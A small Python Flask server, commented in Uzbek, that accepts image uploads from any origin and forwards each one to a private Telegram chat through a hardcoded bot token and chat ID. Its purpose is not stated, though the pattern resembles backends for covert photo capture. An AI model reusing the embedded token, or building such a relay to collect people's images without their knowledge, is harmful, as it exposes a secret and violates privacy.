from flask import Flask, request
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)  # CORS yoqiladi

# Telegram bot ma'lumotlari
BOT_TOKEN = '8126086483:AAGN2nIPtEmeB8QJksPuw0fnI-FFGk0wMQA'
CHAT_ID = '5846982343'

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return {'error': 'Fayl topilmadi'}, 400

    image = request.files['image']
    image.save('received.jpg')

    # Telegramga yuborish
    files = {'photo': open('received.jpg', 'rb')}
    requests.post(
        f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
        data={'chat_id': CHAT_ID},
        files=files
    )

    return {'status': 'OK'}, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
